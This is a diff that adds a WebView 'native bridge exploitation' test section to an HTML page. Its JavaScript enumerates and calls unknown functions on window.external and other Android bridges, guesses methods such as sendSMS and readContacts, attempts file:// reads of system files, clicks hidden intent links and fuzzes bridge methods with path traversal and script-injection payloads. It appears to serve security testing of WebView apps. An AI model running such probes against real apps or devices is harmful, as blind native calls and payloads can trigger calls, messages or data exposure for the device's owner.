@@ -110,6 +110,18 @@
   </div>
 
   <div class="test-section">
+    <h2>⚠️ Native Bridge Exploitation Tests</h2>
+    <p><strong>⚠️ ATTENZIONE:</strong> Questi test tentano di chiamare funzioni native potenzialmente pericolose!</p>
+    <button id="btnExploreExternal">🔍 Esplora window.external</button>
+    <button id="btnTestCommonMethods">📱 Test metodi comuni Android</button>
+    <button id="btnTestFileAccess">📂 Test accesso file system</button>
+    <button id="btnTestAppInfo">ℹ️ Test informazioni app</button>
+    <button id="btnTestIntents">🚀 Test Android Intents</button>
+    <button id="btnFuzzing">🎯 Fuzzing automatico</button>
+    <div id="native-results"></div>
+  </div>
+
+  <div class="test-section">
     <h2>📜 Console Log</h2>
     <div class="log" id="log">Log in esecuzione...</div>
   </div>
@@ -407,6 +419,284 @@
     // Log unhandled promise rejections
     window.addEventListener('unhandledrejection', (e) => {
       log('‼️ Unhandled Promise Rejection:', e.reason);
+    });
+
+    // Native Bridge Exploitation Tests
+    document.getElementById('btnExploreExternal').addEventListener('click', () => {
+      log('🔍 === EXPLORING window.external ===');
+      
+      if (window.external) {
+        // Esplora tutte le proprietà e metodi
+        try {
+          const props = Object.getOwnPropertyNames(window.external);
+          log('📋 window.external properties:', props);
+          
+          props.forEach(prop => {
+            try {
+              const value = window.external[prop];
+              const type = typeof value;
+              log(`  - ${prop}: ${type}`, type === 'function' ? '[FUNCTION]' : value);
+              
+              if (type === 'function') {
+                // Prova a chiamare con parametri comuni
+                try {
+                  // Test con parametri vuoti
+                  const result1 = window.external[prop]();
+                  log(`    └─ ${prop}() result:`, result1);
+                } catch (e) {
+                  log(`    └─ ${prop}() error:`, e.message);
+                }
+              }
+            } catch (e) {
+              log(`  - ${prop}: [ACCESS_DENIED]`, e.message);
+            }
+          });
+          
+          document.getElementById('native-results').innerHTML += '<div>window.external: ✅ Explored</div>';
+        } catch (e) {
+          log('❌ Error exploring window.external:', e);
+          document.getElementById('native-results').innerHTML += '<div>window.external: ❌ Error</div>';
+        }
+      } else {
+        log('❌ window.external not available');
+        document.getElementById('native-results').innerHTML += '<div>window.external: ❌ Not available</div>';
+      }
+    });
+
+    document.getElementById('btnTestCommonMethods').addEventListener('click', () => {
+      log('📱 === TESTING COMMON ANDROID METHODS ===');
+      
+      const commonMethods = [
+        // Metodi Android comuni
+        'showToast', 'toast', 'alert', 'notify',
+        'openApp', 'launchApp', 'startActivity',
+        'getDeviceInfo', 'getAppVersion', 'getBuildInfo',
+        'readContacts', 'getContacts', 'accessContacts',
+        'makeCall', 'sendSMS', 'dial',
+        'takePicture', 'openCamera', 'capturePhoto',
+        'getLocation', 'getCurrentLocation', 'gps',
+        'writeFile', 'readFile', 'saveFile',
+        'openSettings', 'goToSettings',
+        'minimize', 'close', 'exit', 'finish',
+        'shareContent', 'share',
+        'openBrowser', 'openURL',
+        'getClipboard', 'setClipboard'
+      ];
+
+      // Testa su tutti i possibili bridge
+      const bridges = ['window.external', 'window.Android', 'window.webkit', 'window.cordova'];
+      
+      bridges.forEach(bridgeName => {
+        const bridge = eval(bridgeName);
+        if (bridge) {
+          log(`🌉 Testing bridge: ${bridgeName}`);
+          
+          commonMethods.forEach(method => {
+            try {
+              if (typeof bridge[method] === 'function') {
+                log(`  📞 Found method: ${bridgeName}.${method}`);
+                
+                // Prova chiamate con parametri diversi
+                try {
+                  bridge[method]();
+                  log(`    ✅ ${method}() - Success (no params)`);
+                } catch (e) {
+                  log(`    ❌ ${method}() - Error:`, e.message);
+                }
+                
+                try {
+                  bridge[method]('test');
+                  log(`    ✅ ${method}('test') - Success`);
+                } catch (e) {
+                  log(`    ❌ ${method}('test') - Error:`, e.message);
+                }
+              }
+            } catch (e) {
+              // Silently continue
+            }
+          });
+        }
+      });
+      
+      document.getElementById('native-results').innerHTML += '<div>Common Methods: ✅ Tested</div>';
+    });
+
+    document.getElementById('btnTestFileAccess').addEventListener('click', () => {
+      log('📂 === TESTING FILE SYSTEM ACCESS ===');
+      
+      const filePaths = [
+        '/sdcard/',
+        '/storage/emulated/0/',
+        '/data/data/',
+        '/system/build.prop',
+        '/proc/version',
+        '/etc/hosts',
+        'file:///android_asset/',
+        'content://settings/secure/'
+      ];
+
+      // Test fetch con file: protocol
+      filePaths.forEach(path => {
+        fetch(`file://${path}`)
+          .then(response => {
+            log(`📁 File access to ${path}:`, response.status);
+            if (response.ok) {
+              return response.text();
+            }
+          })
+          .then(text => {
+            if (text) {
+              log(`📄 Content of ${path}:`, text.substring(0, 200));
+            }
+          })
+          .catch(e => {
+            log(`❌ File access to ${path} failed:`, e.message);
+          });
+      });
+
+      // Test con XMLHttpRequest
+      const xhr = new XMLHttpRequest();
+      xhr.open('GET', 'file:///system/build.prop', true);
+      xhr.onload = () => {
+        log('📁 XHR file access result:', xhr.responseText.substring(0, 200));
+      };
+      xhr.onerror = (e) => {
+        log('❌ XHR file access failed:', e);
+      };
+      try {
+        xhr.send();
+      } catch (e) {
+        log('❌ XHR file access exception:', e);
+      }
+      
+      document.getElementById('native-results').innerHTML += '<div>File Access: ✅ Tested</div>';
+    });
+
+    document.getElementById('btnTestAppInfo').addEventListener('click', () => {
+      log('ℹ️ === TESTING APP INFORMATION LEAKS ===');
+      
+      // Test proprietà disponibili
+      const infoSources = [
+        'navigator',
+        'window.external',
+        'window.Android',
+        'screen',
+        'history',
+        'location'
+      ];
+
+      infoSources.forEach(sourceName => {
+        const source = eval(sourceName);
+        if (source) {
+          log(`📊 Exploring ${sourceName}:`);
+          
+          try {
+            const props = Object.getOwnPropertyNames(source);
+            props.forEach(prop => {
+              try {
+                const value = source[prop];
+                if (typeof value !== 'function' && value !== null && value !== undefined) {
+                  log(`  - ${sourceName}.${prop}:`, value);
+                }
+              } catch (e) {
+                // Skip restricted properties
+              }
+            });
+          } catch (e) {
+            log(`  ❌ Cannot explore ${sourceName}:`, e.message);
+          }
+        }
+      });
+
+      // Test URL parameters
+      log('🔗 URL Parameters:', window.location.search);
+      log('🔗 URL Hash:', window.location.hash);
+      log('🔗 Full URL:', window.location.href);
+      
+      document.getElementById('native-results').innerHTML += '<div>App Info: ✅ Collected</div>';
+    });
+
+    document.getElementById('btnTestIntents').addEventListener('click', () => {
+      log('🚀 === TESTING ANDROID INTENTS ===');
+      
+      const intentSchemes = [
+        'tel:+1234567890',
+        'sms:+1234567890',
+        'mailto:test@example.com',
+        'geo:0,0?q=latitude,longitude',
+        'market://details?id=com.example.app',
+        'content://contacts/people/',
+        'http://malicious-site.com',
+        'file:///sdcard/',
+        'intent://example.com#Intent;scheme=http;package=com.android.browser;end'
+      ];
+
+      intentSchemes.forEach(intent => {
+        try {
+          // Testa con window.open
+          log(`🔗 Testing intent: ${intent}`);
+          
+          // Crea link nascosto e prova a cliccare
+          const link = document.createElement('a');
+          link.href = intent;
+          link.target = '_blank';
+          link.style.display = 'none';
+          document.body.appendChild(link);
+          
+          setTimeout(() => {
+            try {
+              link.click();
+              log(`  ✅ Intent ${intent} - Click attempted`);
+            } catch (e) {
+              log(`  ❌ Intent ${intent} - Error:`, e.message);
+            } finally {
+              document.body.removeChild(link);
+            }
+          }, 100);
+          
+        } catch (e) {
+          log(`❌ Intent ${intent} failed:`, e.message);
+        }
+      });
+      
+      document.getElementById('native-results').innerHTML += '<div>Android Intents: ✅ Tested</div>';
+    });
+
+    document.getElementById('btnFuzzing').addEventListener('click', () => {
+      log('🎯 === AUTOMATED FUZZING ===');
+      
+      const payloads = [
+        '', 'null', 'undefined', '0', '1', '-1', 'true', 'false',
+        'test', '../../../etc/passwd', '<script>alert(1)</script>',
+        'javascript:alert(1)', 'file:///etc/passwd',
+        '{"test": "value"}', '[1,2,3]', 'function(){return 1;}',
+        '%00', '%2e%2e%2f', '\\x00', '\\n\\r\\t'
+      ];
+
+      if (window.external) {
+        const methods = Object.getOwnPropertyNames(window.external)
+          .filter(prop => typeof window.external[prop] === 'function');
+        
+        log(`🎯 Found ${methods.length} methods to fuzz`);
+        
+        methods.forEach(method => {
+          payloads.forEach(payload => {
+            try {
+              const result = window.external[method](payload);
+              if (result !== undefined) {
+                log(`🎯 window.external.${method}('${payload}') = ${result}`);
+              }
+            } catch (e) {
+              // Log only interesting errors
+              if (!e.message.includes('Not enough arguments')) {
+                log(`🎯 window.external.${method}('${payload}') error: ${e.message}`);
+              }
+            }
+          });
+        });
+      }
+      
+      document.getElementById('native-results').innerHTML += '<div>Fuzzing: ✅ Completed</div>';
     });
 
     log('🚀 WebView Security Test initialized');
